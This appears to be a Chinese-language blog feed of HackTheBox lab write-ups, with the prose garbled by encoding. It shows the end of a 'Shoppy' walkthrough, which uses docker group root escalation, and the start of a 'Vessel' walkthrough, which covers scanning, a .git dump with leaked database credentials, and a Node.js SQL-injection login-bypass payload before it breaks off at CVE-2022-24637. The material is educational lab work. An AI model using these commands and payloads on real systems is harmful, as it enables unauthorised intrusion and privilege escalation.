<p>å›åˆ°é¶æœºsshçª—å£ï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œæç¤º<code>Please enter your master password:</code>æ—¶ï¼Œè¾“å…¥<code>Sample</code></p>
<pre class="line-numbers language-none"><code class="language-none">jaeger@shoppy:/home/deploy$ sudo -u deploy ./password-manager
[sudo] password for jaeger: 
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¯çœ‹åˆ°å·²å¾—åˆ°è´¦æˆ·<code>deploy</code>çš„ç”¨æˆ·åå¯†ç ï¼Œæ‰§è¡Œ<code>su deploy</code>åˆ‡æ¢åˆ°deployè´¦æˆ·</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401200606983.png" style="zoom:80%;">

<p>çœ‹åˆ°deployç”¨æˆ·å±äº<code>docker</code>ç»„ï¼Œåœ¨å¦‚ä¸‹ç½‘ç«™æœç´¢<code>docker</code></p>
<pre class="line-numbers language-none"><code class="language-none">https://gtfobins.github.io/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="äº”ã€dockerææƒ"><a href="#äº”ã€dockerææƒ" class="headerlink" title="äº”ã€dockerææƒ"></a>äº”ã€dockerææƒ</h2><p>çœ‹åˆ°å¦‚ä¸‹ææƒå‘½ä»¤</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401201138192.png" style="zoom: 67%;">

<p>ä¸ºäº†è®©è·å¾—çš„shellç¯å¢ƒæ›´ç¨³å®šï¼ŒæŠŠåé¢çš„<code>sh</code>æ¢æˆ<code>bash</code>ï¼Œæ‰§è¡Œ</p>
<pre class="line-numbers language-none"><code class="language-none">deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æˆåŠŸè·å–rootæƒé™</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401200943631.png" style="zoom:80%;">

<p>Overï¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411190035530.png" style="zoom:80%;">

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/qq_45894840/article/details/127527914">https://blog.csdn.net/qq_45894840/article/details/127527914</a></p>
<p><a href="https://0xdf.gitlab.io/2023/01/14/htb-shoppy.html">https://0xdf.gitlab.io/2023/01/14/htb-shoppy.html</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>ä¸‡èƒ½å¯†ç </tag>
        <tag>é€†å‘å…¥é—¨</tag>
        <tag>dockerææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Vessel</title>
    <url>/posts/7c3ddaa9.html</url>
    <content><![CDATA[<h1 id="HTB-Vessel"><a href="#HTB-Vessel" class="headerlink" title="HTB-Vessel"></a>HTB-Vessel</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><ol>
<li>ä¿¡æ¯æ”¶é›†å‘ç°Gitä¿¡æ¯æ³„éœ²ï¼›</li>
<li>åˆ†æGitä¿¡æ¯å‘ç°Nodejs-SQLæ³¨å…¥ï¼›</li>
<li>Nodejs-SQLæ³¨å…¥ä»¥adminèº«ä»½ç™»å½•ä¸»ç«™ï¼›</li>
<li>ä¸»ç«™æºç å‘ç°openwebanalyticså­åŸŸï¼›</li>
<li>Googleå‘ç°OpenWebAnalyticså­˜åœ¨CVE-2022-24637ï¼›</li>
<li>CVE-2022-24637ä»¥adminèº«ä»½ç™»å½•openwebanalyticså­åŸŸå¹¶è·å–www-dataç”¨æˆ·shellï¼›</li>
<li><code>/home/steven</code>å‘ç°å¯ç–‘åŠ å¯†PDFæ–‡ä»¶å’Œå¯†ç ç”Ÿæˆç¨‹åºï¼›</li>
<li>Pythonåç¼–è¯‘å¯†ç ç”Ÿæˆç¨‹åºç ´è§£PDFå¯†ç è·å–SSHç”¨æˆ·å¯†ç ï¼›</li>
<li>ç™»å½•SSHç”¨æˆ·æŸ¥è¯¢æ‹¥æœ‰suidæƒé™çš„æ–‡ä»¶å‘ç°CVE-2022-0811ï¼›</li>
<li>CVE-2022-0811å†…æ ¸ææƒè·å–rootç”¨æˆ·æƒé™ã€‚</li>
</ol>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«ç«¯å£</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -sC -sV 10.10.11.178    
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-20 21:58 EDT
Nmap scan report for 10.10.11.178
Host is up (0.78s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 38:c2:97:32:7b:9e:c5:65:b4:4b:4e:a3:30:a5:9a:a5 (RSA)
|   256 33:b3:55:f4:a1:7f:f8:4e:48:da:c5:29:63:13:83:3d (ECDSA)
|_  256 a1:f1:88:1c:3a:39:72:74:e6:30:1f:28:b6:80:25:4e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Vessel
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.56 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¼€æ”¾ç«¯å£ï¼š22ï¼ˆsshï¼‰ã€80ï¼ˆhttpï¼‰</p>
<p>æµè§ˆå™¨è®¿é—®IPï¼Œé¡µé¢å¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230321112036014.png"></p>
<p>ffufæšä¸¾å­ç›®å½•</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -mc 200,301 -u http://10.10.11.178/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.178/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,301
________________________________________________

[Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 576ms]
    * FUZZ: dev

[Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 4584ms]
    * FUZZ: css

[Status: 200, Size: 2393, Words: 999, Lines: 52, Duration: 525ms]
    * FUZZ: 404

[Status: 200, Size: 4213, Words: 1929, Lines: 71, Duration: 288ms]
    * FUZZ: login

[Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 884ms]
    * FUZZ: js

[Status: 200, Size: 5830, Words: 3040, Lines: 90, Duration: 2728ms]
    * FUZZ: register

[Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 2683ms]
    * FUZZ: img

[Status: 200, Size: 2335, Words: 991, Lines: 52, Duration: 302ms]
    * FUZZ: 500

[Status: 200, Size: 15030, Words: 5599, Lines: 244, Duration: 301ms]
    * FUZZ: 

[Status: 200, Size: 3637, Words: 1604, Lines: 64, Duration: 374ms]
    * FUZZ: reset

[Status: 200, Size: 2400, Words: 1029, Lines: 53, Duration: 362ms]
    * FUZZ: 401

:: Progress: [26584/26584] :: Job [1/1] :: 293 req/sec :: Duration: [0:01:40] :: Errors: 2 ::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>301ï¼š<code>/dev</code>ã€<code>/css</code>ã€<code>/js</code>ã€<code>/img</code></p>
<p>200ï¼š<code>/404</code>ã€<code>/login</code>ã€<code>/register</code>ã€<code>/500</code>ã€<code>/reset</code>ã€<code>/401</code></p>
<p>ä»¥ä¸Šç›®å½•ï¼Œåªæœ‰<code>/dev</code>æœ€å¯èƒ½å­˜åœ¨çº¿ç´¢ï¼Œå› ä¸ºå…¶ä»–å‡ ä¸ªéƒ½æ˜¯æ¯”è¾ƒå¸¸è§„çš„åŠŸèƒ½ç‚¹ã€‚ä½†å¯¹<code>/dev</code>ç›®å½•åšæšä¸¾ï¼Œæ²¡å‘ç°ä»€ä¹ˆä¸œè¥¿ï¼Œå°±çŒœä¸€ä¸‹<code>.git</code>ï¼Œä½†<code>/dev/.git</code>åšäº†è·³è½¬ï¼Œä¼šè·³è½¬åˆ°404ï¼Œå°±è¿›ä¸€å±‚å¯¹<code>/dev/.git/</code>çš„å­ç›®å½•åšæšä¸¾</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 100 -mc 200,301 -u http://10.10.11.178/dev/.git/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.178/dev/.git/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,301
________________________________________________

[Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 280ms]
    * FUZZ: info

[Status: 200, Size: 2607, Words: 18, Lines: 19, Duration: 4971ms]
    * FUZZ: index

[Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 6035ms]
    * FUZZ: logs

[Status: 301, Size: 199, Words: 7, Lines: 11, Duration: 6166ms]
    * FUZZ: objects

[Status: 301, Size: 195, Words: 7, Lines: 11, Duration: 379ms]
    * FUZZ: hooks

[Status: 200, Size: 139, Words: 13, Lines: 9, Duration: 7085ms]
    * FUZZ: config

[Status: 200, Size: 73, Words: 10, Lines: 2, Duration: 281ms]
    * FUZZ: description

[Status: 301, Size: 201, Words: 7, Lines: 11, Duration: 262ms]
    * FUZZ: branches

[Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 279ms]
    * FUZZ: refs

:: Progress: [63087/63087] :: Job [1/1] :: 322 req/sec :: Duration: [0:02:58] :: Errors: 0 ::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç¡®å®šå­˜åœ¨Gitä¿¡æ¯æ³„éœ²</p>
<h2 id="ä¸‰ã€Gitä¿¡æ¯æ³„éœ²"><a href="#ä¸‰ã€Gitä¿¡æ¯æ³„éœ²" class="headerlink" title="ä¸‰ã€Gitä¿¡æ¯æ³„éœ²"></a>ä¸‰ã€Gitä¿¡æ¯æ³„éœ²</h2><p>Gitä¿¡æ¯æ³„éœ²å‚è€ƒï¼š<a href="https://www.freebuf.com/articles/web/318599.html">https://www.freebuf.com/articles/web/318599.html</a></p>
<p>ç”¨<code>git-dumper</code>å·¥å…·æŠŠgitç›¸å…³æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°ï¼ˆä¹Ÿå¯ä»¥ç”¨<code>GitHack</code>ï¼‰ï¼Œæ­¤å¤„ä¸‹è½½åˆ°<code>./Vessel/git</code>ç›®å½•ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pip install git-dumper
git-dumper http://10.10.11.178/dev ./Vessel/git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230321112301438.png"></p>
<p><code>git log</code>çœ‹ä¸€ä¸‹gitæ—¥å¿—ï¼Œçœ‹åˆ°é‚®ç®±<code>ethan@vessel.htb</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# cd Vessel/git
                                                                                     
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/Vessel/git]
â””â”€# git log                                                                           
commit 208167e785aae5b052a4a2f9843d74e733fbd917 (HEAD -&gt; master)
Author: Ethan &lt;ethan@vessel.htb&gt;
Date:   Mon Aug 22 10:11:34 2022 -0400

    Potential security fixes

commit edb18f3e0cd9ee39769ff3951eeb799dd1d8517e
Author: Ethan &lt;ethan@vessel.htb&gt;
Date:   Fri Aug 12 14:19:19 2022 -0400

    Security Fixes

commit f1369cfecb4a3125ec4060f1a725ce4aa6cbecd3
Author: Ethan &lt;ethan@vessel.htb&gt;
Date:   Wed Aug 10 15:16:56 2022 -0400

    Initial commit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç”¨<code>treeå‘½ä»¤</code>çœ‹ä¸€ä¸‹æ–‡ä»¶ç›®å½•æ ‘ï¼ˆä¹Ÿå¯ç”¨<code>GitKraken</code>æˆ–å…¶ä»–å®¡è®¡ç±»å·¥å…·åˆ†ægitæ–‡ä»¶ï¼‰</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# tree -a Vessel/git/    
Vessel/git/
â”œâ”€â”€ config
â”‚&nbsp;&nbsp; â””â”€â”€ db.js
â”œâ”€â”€ .git
â”‚&nbsp;&nbsp; â”œâ”€â”€ COMMIT_EDITMSG
â”‚&nbsp;&nbsp; â”œâ”€â”€ config
â”‚&nbsp;&nbsp; â”œâ”€â”€ description
â”‚&nbsp;&nbsp; â”œâ”€â”€ HEAD
â”‚&nbsp;&nbsp; â”œâ”€â”€ hooks
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ applypatch-msg.sample
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ commit-msg.sample
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ post-update.sample
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ pre-applypatch.sample
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ pre-commit.sample
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ prepare-commit-msg.sample
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ pre-push.sample
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ pre-rebase.sample
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ pre-receive.sample
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ update.sample
â”‚&nbsp;&nbsp; â”œâ”€â”€ index
â”‚&nbsp;&nbsp; â”œâ”€â”€ info
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ exclude
â”‚&nbsp;&nbsp; â”œâ”€â”€ logs
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ HEAD
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ refs
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp;     â””â”€â”€ heads
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp;         â””â”€â”€ master
â”‚&nbsp;&nbsp; â”œâ”€â”€ objects
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ 00
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ 459be15fd7f38a86843ba1ce5cd6eabeb50a59
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ 0a
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ ddd8d9ac7f6daf0d44ee78925d07de0a3dee44
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ ......
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ ......
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ fc
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp;     â””â”€â”€ 5ce922a9d1073d6c9cc34770c140cc3488f3fa
â”‚&nbsp;&nbsp; â”œâ”€â”€ ORIG_HEAD
â”‚&nbsp;&nbsp; â””â”€â”€ refs
â”‚&nbsp;&nbsp;     â””â”€â”€ heads
â”‚&nbsp;&nbsp;         â””â”€â”€ master
â”œâ”€â”€ index.js
â”œâ”€â”€ public
â”‚&nbsp;&nbsp; â”œâ”€â”€ css
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ style.css
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ styles.css
â”‚&nbsp;&nbsp; â”œâ”€â”€ img
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ bg-masthead.jpg
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ error-404-monochrome.svg
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ favicon.ico
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ portfolio
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ thumbnails
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp;     â”œâ”€â”€ 1.jpg
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp;     â”œâ”€â”€ 2.jpg
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp;     â”œâ”€â”€ 3.jpg
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp;     â”œâ”€â”€ 4.jpg
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp;     â”œâ”€â”€ 5.jpg
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp;     â”œâ”€â”€ 6.jpg
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp;     â””â”€â”€ images.zip
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ profile.jpg
â”‚&nbsp;&nbsp; â””â”€â”€ js
â”‚&nbsp;&nbsp;     â”œâ”€â”€ script.js
â”‚&nbsp;&nbsp;     â””â”€â”€ scripts.js
â”œâ”€â”€ routes
â”‚&nbsp;&nbsp; â””â”€â”€ index.js
â””â”€â”€ views
    â”œâ”€â”€ 401.ejs
    â”œâ”€â”€ 404.ejs
    â”œâ”€â”€ 500.ejs
    â”œâ”€â”€ index.ejs
    â”œâ”€â”€ login.ejs
    â”œâ”€â”€ register.ejs
    â””â”€â”€ reset.ejs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨<code>./Vessel/git/config/db.js</code> çœ‹åˆ°æ•°æ®åº“è¿æ¥ä¿¡æ¯</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# cat ./Vessel/git/config/db.js                                                    
var mysql = require('mysql');

var connection = {
        db: {
        host     : 'localhost',
        user     : 'default',
        password : 'daqvACHKvRn84VdVp',
        database : 'vessel'
}};

module.exports = connection;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨<code>./Vessel/git/routes/index.js</code>çœ‹åˆ°ç™»å½•é¡µé¢çš„æ•°æ®åº“æŸ¥è¯¢è¯­å¥</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat ./Vessel/git/routes/index.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">router.post('/api/login', function(req, res) {
        let username = req.body.username;
        let password = req.body.password;
        if (username &amp;&amp; password) {
                connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) {
                        if (error) throw error;
                        if (results.length &gt; 0) {
                                req.session.loggedin = true;
                                req.session.username = username;
                                req.flash('success', 'Succesfully logged in!');
                                res.redirect('/admin');
                        } else {
                                req.flash('error', 'Wrong credentials! Try Again!');
                                res.redirect('/login');
                        }
                        res.end();
                });
        } else {
                res.redirect('/login');
        }
});<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ­¤å¤„çš„SQLæŸ¥è¯¢è¯­å¥å‚æ•°åšäº†å ä½ç¬¦å¤„ç†ï¼Œç›¸å½“äºæ˜¯é¢„ç¼–è¯‘</p>
<p>ç›´æ¥æŠŠè¿™æ¡è¯­å¥å¤åˆ¶åˆ°googleæœç´¢ï¼Œæ‰¾åˆ°å¦‚ä¸‹æ–‡ç« ï¼Œæ˜¯Nodejsçš„SQLæ³¨å…¥</p>
<h2 id="å››ã€Nodejs-SQLæ³¨å…¥"><a href="#å››ã€Nodejs-SQLæ³¨å…¥" class="headerlink" title="å››ã€Nodejs-SQLæ³¨å…¥"></a>å››ã€Nodejs-SQLæ³¨å…¥</h2><p>å‚è€ƒï¼š<a href="https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/">https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/</a></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230324123922105.png" style="zoom:80%;">

<p>æ„æ€å¤§æ¦‚æ˜¯è¯´ï¼Œå½“æ„é€ ä¼ å‚payloadä¸º<code>username=admin&amp;password[password]=1</code>æ—¶ï¼Œç”±äºNodejsæœ¬èº«çš„ç‰¹æ€§ï¼Œä¼šå°†<code>password[password]=1</code>è§£ææˆä¸€ä¸ªå¯¹è±¡ï¼Œè€Œä¸æ˜¯è§£ææˆå­—ç¬¦ä¸²ï¼Œä»è€ŒsqlæŸ¥è¯¢è¯­å¥ä¼šå˜æˆå¦‚ä¸‹</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> accounts <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token identifier"><span class="token punctuation">`</span>password<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä»è€Œä½¿usernameä¸ºadminï¼Œè€Œpasswordé€»è¾‘åˆ¤æ–­æ’ä¸º1ï¼ˆå¸ƒå°”trueï¼‰ï¼Œä»¥æ­¤è¾¾åˆ°ç±»ä¼¼ä¸‡èƒ½å¯†ç çš„æ•ˆæœã€‚</p>
<p>å¼€å§‹æ“ä½œ</p>
<p>ç‚¹å‡»ä¸»é¡µé¢å³ä¸Šè§’Loginè¿›å…¥ç™»å½•é¡µé¢ï¼Œéšä¾¿è¾“å…¥ç”¨æˆ·åå¯†ç ï¼ŒåŒæ—¶BurpæŠ“åŒ…</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230324143405098.png"></p>
<p>ä¿®æ”¹è¯·æ±‚åŒ…æ•°æ®éƒ¨åˆ†ä¸º<code>username=admin&amp;password[password]=1</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230324144607229.png"></p>
<p>è¿ç»­ç‚¹å‡»ä¸¤æ¬¡Forwardï¼Œå›åˆ°æµè§ˆå™¨ï¼Œå¯çœ‹åˆ°ä»¥adminèº«ä»½ç™»å½•æˆåŠŸ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230324144443893.png"></p>
<p>æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œå‘ç°å¦‚ä¸‹å­åŸŸå</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325102350474.png"></p>
<p>å°†å­åŸŸåå†™å…¥æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo "10.10.11.178 openwebanalytics.vessel.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æµè§ˆå™¨æ‰“å¼€<code>openwebanalytics.vessel.htb</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325102753229.png"></p>
<p>ç™»å½•æ¡†ä¸Šä¸‹éƒ½å†™ç€<code>Open Web Analytics</code>ï¼Œé‚£å°±å»googleä¸€ä¸‹<code>Open Web Analytics exploit</code>ï¼Œçœ‹åˆ°äº†è¿™ç¯‡æ–‡ç« </p>
<p>From Single/Double Quote Confusion To RCE(CVE-2022-24637)ï¼š<a href="https://devel0pment.de/?p=2494">https://devel0pment.de/?p=2494</a></p>
<h2 id="äº”ã€CVE-2022-24637"><a href="#äº”ã€CVE-2022-24637" class="headerlink" title="äº”ã€CVE-2022-24637"></a>äº”ã€CVE-2022-24637</h2><p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325161021370.png"></p>
<p>å¦‚å›¾ï¼Œæ–‡ç« å¼€å¤´ä»‹ç»äº†è¿™ä¸ªCVEçš„ä¸¤ä¸ªæ¼æ´ç‚¹ï¼š</p>
<ol>
